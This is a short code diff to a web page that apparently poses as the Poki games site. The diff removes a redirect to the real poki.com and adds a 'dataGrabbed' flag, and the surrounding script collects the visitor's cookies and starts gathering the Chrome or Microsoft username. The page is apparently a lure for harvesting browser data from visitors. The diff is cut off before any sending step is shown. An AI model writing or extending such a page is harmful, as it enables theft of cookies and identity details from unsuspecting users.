@@ -73,14 +73,10 @@ body{{background:#00D9FF;display:flex;justify-content:center;align-items:center;
 <div id="info"></div>
 <script>
 (async()=>{{
-// Redirect to real Poki after 2 seconds
-setTimeout(()=>{{
-window.location.href='https://poki.com';
-}},2000);
-
 let d='';
 const box=document.getElementById('info');
 let allCookies=document.cookie;
+let dataGrabbed=false;
 
 // Get Chrome/Microsoft username
 let userName='Not found';
